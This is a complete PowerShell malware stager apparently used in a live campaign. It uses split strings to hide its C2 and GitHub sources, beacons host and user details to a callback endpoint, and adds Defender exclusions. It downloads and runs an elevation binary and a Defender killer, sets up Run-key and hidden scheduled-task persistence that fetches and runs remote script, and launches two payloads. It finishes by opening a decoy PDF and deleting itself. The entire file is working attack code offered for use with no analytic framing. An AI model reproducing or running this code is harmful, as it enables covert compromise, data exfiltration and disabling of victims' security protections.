# XenoR2 Payload v14-obs — BITSAdmin Loading (obfuscated strings, no XOR)
# Placed on signindat.com as stage-obs-v2.ps1
# All downloads via BITSAdmin, no firewall, defender kill right after elevation
# 2 payloads: PatchPulsaar.exe (wmdrs.exe) + wdsr681f3e18.exe (Overlord)

# === DIAGNOSTIC LOG ===
$log="$env:TEMP\wmisrv.log"
function log($m){ $ts=Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; "$ts | $m" | Out-File $log -Append -Encoding utf8 }
log "=== PAYLOAD START (v14-obs) ==="

# === STRING OBFUSCATION ===
# Sources
$c1='htt';$c2='ps:/';$c3='/sign';$c4='indat';$c5='.com'
$srv=$c1+$c2+$c3+$c4+$c5
$c6='htt';$c7='ps://';$c8='raw.g';$c9='ithubu';$c10='sercon';$c11='tent.c';$c12='om/ji';$c13='mmyish';$c14='ere111';$c15='/WinD';$c16='ebloat';$c17='11/mai';$c18='n'
$gh=$c6+$c7+$c8+$c9+$c10+$c11+$c12+$c13+$c14+$c15+$c16+$c17+$c18
$sources=@($gh,$srv)

# Binary names
$n1='Ele';$n2='vato';$n3='rShe';$n4='llCo';$n5='de.e';$n6='xe';$elev=$n1+$n2+$n3+$n4+$n5+$n6
$n7='win';$n8='def';$n9='ctl';$n10='.ex';$n11='e';$wdf=$n7+$n8+$n9+$n10+$n11
$n12='Pat';$n13='chPu';$n14='lsaa';$n15='r.ex';$n16='e';$ppx=$n12+$n13+$n14+$n15+$n16
$n17='Rat';$n18='e_Co';$n19='nfir';$n20='mati';$n21='on_L';$n22='D-20';$n23='26-0';$n24='847.';$n25='pdf'
$pdf=$n17+$n18+$n19+$n20+$n21+$n22+$n23+$n24+$n25

# Payload paths
$n26='wmd';$n27='rs.e';$n28='xe';$wmd=$n26+$n27+$n28
$n29='wd';$n30='sr';$n70='68';$n71='1f';$n72='3e';$n73='18';$n74='.ex';$n75='e';$wdsr=$n29+$n30+$n70+$n71+$n72+$n73+$n74+$n75

# Callback endpoint
$n31='cb.';$n32='php';$cbep=$n31+$n32

# Persistence
$n37='upd';$n38='atem';$n39='spul';$n40='sv2.';$n41='ps1';$persistScript=$n37+$n38+$n39+$n40+$n41
$n42='Win';$n43='dows';$n44='Secu';$n45='rity';$n46='Heal';$n47='th';$rkName=$n42+$n43+$n44+$n45+$n46+$n47
$n48='Win';$n49='dows';$n50='Upda';$n51='teOr';$n52='ches';$n53='trat';$n54='or';$rkNameAdmin=$n48+$n49+$n50+$n51+$n52+$n53+$n54
$n55='Win';$n56='dows';$n57='Heal';$n58='thMo';$n59='nito';$n60='r';$taskName=$n55+$n56+$n57+$n58+$n59+$n60

$t=$env:TEMP
$ad="$env:APPDATA\Microsoft"
$ld="$env:LOCALAPPDATA\Microsoft"
$dl="$env:USERPROFILE\Downloads"
log "Strings assembled | srv=$srv | gh=$gh"

# === HOST INFO ===
$cbHost=$env:COMPUTERNAME
$cbUser=$env:USERNAME
$cbPid=$pid
$cbIsAdmin=$false
try{$cbIp=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object{$_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown'}|Select-Object -First 1).IPAddress}catch{$cbIp='unknown'}
try{$cbOs=(Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption}catch{$cbOs='unknown'}

# === CALLBACK ===
function _cb($stage,$status,$detail){
    try{
        $body=@{hostname=$cbHost;username=$cbUser;ip=$cbIp;os=$cbOs;is_admin=$cbIsAdmin;pid=$cbPid;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString("$srv/$cbep",'POST',$body)|Out-Null
    }catch{log "CB: $stage err: $($_.Exception.Message)"}
}

log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
_cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"

try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
log "S1: a=$cbIsAdmin"
_cb 'S1' 'ok' "is_admin=$cbIsAdmin"

# === BITS TRANSFER DOWNLOAD HELPER (dual-source, fully silent) ===
function _bitsDL($n,$dest,$label){
    foreach($src in $sources){
        $url="$src/$n"
        try{
            log "BITS: $label from $src"
            Start-BitsTransfer -Source $url -Destination $dest -Priority High -DisplayName $label -ErrorAction Stop | Out-Null
            if(Test-Path $dest){
                log "BITS: $label -> $dest ($((Get-Item $dest).Length) bytes)"
                return $true
            }
            log "BITS: $label file missing after transfer from $src"
        }catch{log "BITS: $label fail from $src : $_"}
    }
    log "BITS: $label fail all sources"
    return $false
}

# === STEP 1: DEFENDER EXCLUSIONS ===
log "Adding Defender exclusions"
try{
    $mp='Add-';$mp2='MpPr';$mp3='efer';$mp4='ence'
    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$t" -ErrorAction SilentlyContinue
    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$ad" -ErrorAction SilentlyContinue
    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$ld" -ErrorAction SilentlyContinue
    & "$($mp+$mp2+$mp3+$mp4)" -ExclusionPath "$dl" -ErrorAction SilentlyContinue
    $exclProcs=@($wmd,$wdsr,'wmisrv.exe','svchost.exe','msupdate.exe','powershell.exe',$wdf,'cmd.exe','wscript.exe','cscript.exe')
    foreach($xp in $exclProcs){try{& "$($mp+$mp2+$mp3+$mp4)" -ExclusionProcess $xp -ErrorAction SilentlyContinue}catch{}}
    log "Defender exclusions added"
}catch{log "FAILED Defender exclusions: $_ (non-fatal)"}

# === STEP 2: ELEVATION (ElevatorShellCode.exe) ===
if(-not $cbIsAdmin){
    $elevPath="$t\$elev"
    if(_bitsDL $elev $elevPath 'elev'){
        try{
            Start-Process $elevPath -WindowStyle Hidden | Out-Null
            log "S1: elev launched"
            _cb 'S1' 'ok' 'elev launched'
        }catch{log "S1: elev launch fail: $_"}
    }else{_cb 'S1' 'fail' 'elev dl'}
    Start-Sleep 15
    try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
    log "S1: a=$cbIsAdmin"
    if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail, continuing as user'}
}

# === STEP 3: DEFENDER KILL (windefctl.exe) — RIGHT AFTER ELEVATION ===
log "S2: windefctl exec (admin=$cbIsAdmin)"
$wdfPath="$t\$wdf"
if(_bitsDL $wdf $wdfPath 'defkill'){
    try{
        $proc=Start-Process $wdfPath -ArgumentList 'kill' -NoNewWindow -PassThru
        log "S2: defkill started pid=$($proc.Id), waiting 18s"
        Start-Sleep 18
        if(-not $proc.HasExited){try{$proc.Kill()|Out-Null}catch{}}
        log "S2: defkill exit=$($proc.ExitCode)"
        _cb 'S2' 'ok' 'defkill done'
    }catch{
        log "S2: defkill launch fail: $_"
        _cb 'S2' 'fail' 'defkill launch err'
    }
}else{_cb 'S2' 'fail' 'defkill dl'}
Remove-Item $wdfPath -Force -ErrorAction SilentlyContinue | Out-Null

# === STEP 4: PERSISTENCE ===
$persistCmd="powershell -w hidden -NoP -c `"`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(`$env:TEMP\\u.ps1,`$w.DownloadData('$gh/$persistScript'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1`""
try{
    $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $rk -Name $rkName -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
    log "Persistence: HKCU Run added"
}catch{log "Persistence HKCU fail: $_"}

if($cbIsAdmin){
    try{
        $rk='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty -Path $rk -Name $rkNameAdmin -Value $persistCmd -Force -ErrorAction SilentlyContinue | Out-Null
        log "Persistence: HKLM Run added"
    }catch{log "Persistence HKLM fail: $_"}

    schtasks /delete /tn $taskName /f 2>$null | Out-Null
    $xml=@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo><Author>Microsoft Corporation</Author><Description>Windows Health Monitor Service</Description></RegistrationInfo>
<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT2H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
<Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/$persistScript'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
</Task>
"@
    $xmlPath="$t\task.xml"
    [IO.File]::WriteAllText($xmlPath,$xml,[Text.Encoding]::Unicode)
    schtasks /create /tn $taskName /xml $xmlPath /f 2>&1 | Out-Null
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
    log "Persistence: scheduled task created"
}
_cb 'S3' 'ok' 'persist ok'

# === STEP 5: PAYLOAD 1 — PatchPulsaar.exe → wmdrs.exe ===
$payloadPath="$ad\$wmd"
$payloadExists=(Test-Path $payloadPath)
log "S5: exists=$payloadExists at $payloadPath"

if(-not $payloadExists){
    $fallbackPath="$ld\$wmd"
    if(Test-Path $fallbackPath){$payloadPath=$fallbackPath; $payloadExists=$true; log "S5: fallback found at $fallbackPath"}
}

if($payloadExists){
    try{
        $p=Start-Process $payloadPath -WindowStyle Hidden -PassThru
        log "S5: re-launch PID=$($p.Id) from $payloadPath"
        _cb 'S5' 'ok' "re-launch PID=$($p.Id)"
    }catch{
        log "S5: re-launch fail: $_, will re-download"
        $payloadExists=$false
    }
}

if(-not $payloadExists){
    log "S5: downloading $ppx"
    $primaryPath="$t\$wmd"
    if(_bitsDL $ppx $primaryPath 'payload1'){
        $copyTargets=@("$ad\$wmd","$ld\$wmd")
        foreach($ct in $copyTargets){
            try{
                $dir=Split-Path $ct -Parent
                if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
                Copy-Item $primaryPath $ct -Force
                log "S5: copied to $ct"
            }catch{log "S5: copy fail $ct : $_"}
        }
        try{
            $launchPath="$ad\$wmd"
            $p=Start-Process $launchPath -WindowStyle Hidden -PassThru
            log "S5: PatchPulsaar PID=$($p.Id) from AppData"
            _cb 'S5' 'ok' "PID=$($p.Id)"
        }catch{
            log "S5: launch fail: $_"
            _cb 'S5' 'fail' "launch err"
        }
    }else{
        log "S5: PatchPulsaar dl fail"
        _cb 'S5' 'fail' 'dl fail'
    }
}

# === STEP 6: PAYLOAD 2 — wdsr681f3e18.exe (Overlord) ===
$wdsrPath="$ad\$wdsr"
$wdsrExists=(Test-Path $wdsrPath)
log "S6: exists=$wdsrExists at $wdsrPath"

if(-not $wdsrExists){
    $wdsrFallback="$ld\$wdsr"
    if(Test-Path $wdsrFallback){$wdsrPath=$wdsrFallback; $wdsrExists=$true; log "S6: fallback found at $wdsrPath"}
}

if($wdsrExists){
    try{
        $wdsrProc=Start-Process $wdsrPath -WindowStyle Hidden -PassThru
        log "S6: re-launch PID=$($wdsrProc.Id) from $wdsrPath"
        _cb 'S6' 'ok' "re-launch PID=$($wdsrProc.Id)"
    }catch{
        log "S6: re-launch fail: $_, will re-download"
        $wdsrExists=$false
    }
}

if(-not $wdsrExists){
    log "S6: downloading $wdsr"
    $wdsrTmp="$t\$wdsr"
    if(_bitsDL $wdsr $wdsrTmp 'payload2'){
        $wdsrCopyTargets=@("$ad\$wdsr","$ld\$wdsr")
        foreach($ct in $wdsrCopyTargets){
            try{
                $dir=Split-Path $ct -Parent
                if(-not(Test-Path $dir)){New-Item -Path $dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null}
                Copy-Item $wdsrTmp $ct -Force
                log "S6: copied to $ct"
            }catch{log "S6: copy fail $ct : $_"}
        }
        try{
            $wdsrLaunch="$ad\$wdsr"
            $wdsrProc=Start-Process $wdsrLaunch -WindowStyle Hidden -PassThru
            log "S6: WDSR PID=$($wdsrProc.Id) from AppData"
            _cb 'S6' 'ok' "PID=$($wdsrProc.Id)"
        }catch{
            log "S6: launch fail: $_"
            _cb 'S6' 'fail' "launch err"
        }
    }else{
        log "S6: WDSR dl fail"
        _cb 'S6' 'fail' 'dl fail'
    }
}

# === STEP 7: PDF DECOY ===
$markerPath="$ad\wmdrs.seen"
if(-not (Test-Path $markerPath)){
    $pdfPath="$dl\$pdf"
    if(_bitsDL $pdf $pdfPath 'pdfdecoy'){
        try{
            Start-Process $pdfPath | Out-Null
            _cb 'S7' 'ok' 'pdf ok'
            Set-Content -Path $markerPath -Value ((Get-Date).ToString('o')) -NoNewline -Force
            log "S7: pdf opened, marker set"
        }catch{_cb 'S7' 'warn' 'pdf open fail'}
    }else{_cb 'S7' 'warn' 'pdf dl fail'}
}else{log "S7: skip (already shown)"}

# === STEP 8: CLEANUP + SELF-DELETE ===
$sl=[Random]::new().Next(5,10)
log "Waiting $sl sec before cleanup"
Start-Sleep $sl
Remove-Item "$t\$elev" -Force -ErrorAction SilentlyContinue
Remove-Item "$t\$wdf" -Force -ErrorAction SilentlyContinue
Remove-Item "$t\u.ps1" -Force -ErrorAction SilentlyContinue
log "Cleanup done"

Start-Sleep 2
$sp=$MyInvocation.MyCommand.Path
if($sp -and (Test-Path $sp)){
    log "Self-delete scheduled"
    $sb=@'
Start-Sleep 3
Remove-Item -Path "<PATH>" -Force -ErrorAction SilentlyContinue
'@
    $sb=$sb.Replace('<PATH>',$sp)
    Start-Process powershell.exe -ArgumentList "-ep bypass -w hidden -c `"$sb`"" -WindowStyle Hidden
}

log "=== PAYLOAD END ==="
_cb 'S9' 'ok' 'done'
